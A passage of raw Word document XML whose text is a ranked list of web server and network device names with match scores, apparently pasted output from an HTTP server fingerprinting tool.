        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>29  0.58</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="32A95BDB" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">HP Jet-Direct Print Server: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>29  0.58</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2635B5E8" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Tanberg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 880 video </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>29  0.58</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="75903FFC" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">GWS/2.1 Google Web Server: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>30  0.52</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="39F39FAB" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Oracle XML DB/Oracle9i: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>15  0.49</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="524141C1" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft ISA Server (external): </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>15  0.49</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2C8472C4" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Netgear</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> MR814v2 - IP_SHARER WEB 1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>15  0.49</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="70338106" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Lotus-Domino/5.x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>14  0.45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="02E9A963" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EHTTP/1.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>14  0.45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5913E526" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft-IIS/5.0 Virtual Host: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>14  0.45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6B4AC6C2" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Tomcat Web Server/3.2.3: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>14  0.45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2EB7FD29" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Adaptec ASM 1.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>14  0.45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6377CAF6" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Zeus/4.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>11  0.32</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="05B21AA2" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MiniServ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/0.01 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Webmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>33  0.29</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1CB47579" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>SunONE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>WebServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="520B5469" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/4.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="17B2157E" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>RemotelyAnywhere</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="25EF31FB" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Cisco-HTTP: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="645D2E4B" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>CompaqHTTPServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-SSL/4.2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="65C5D15B" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">3Com/v1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="70FD6F4A" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft ISA Server (internal): </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="45A364EA" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>WebSENSE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="286348BD" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Cisco Pix 6.2: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10  0.27</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="03EA4B70" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Orion/2.0x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>37  0.22</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4E5CB3D2" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CompaqHTTPServer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>37  0.22</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="556B589A" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys Print Server: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>8  0.19</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1232F992" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Domino-Go-Webserver/4.6.2.8: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>34  0.18</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="489CFF8D" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>AOLserver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/3.4.2-3.5.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>34  0.18</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4A048FD3" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>RomPager</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/4.07 UPnP/1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>34  0.18</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2C0E760F" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ServletExec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>5  0.08</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="41D3E036" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/6.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>36  0.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="784D4B62" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Allied </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Telesyn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ethernet switch: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>36  0.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4851F1A7" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">WebLogic XMLX Module 8.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>36  0.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0AB061AC" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Netscape-Enterprise/3.5.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>35  0.06</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2B9FBA55" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Jana Server/1.45: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>35  0.06</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="29BC2739" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys AP1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="32396F1A" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys Router: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="60681787" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Snap Appliances, Inc./3.x: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="145B8324" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">NetBuilderHTTPDv0.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0  0.00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="15C2C18A" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>NetPort</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Software 1.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
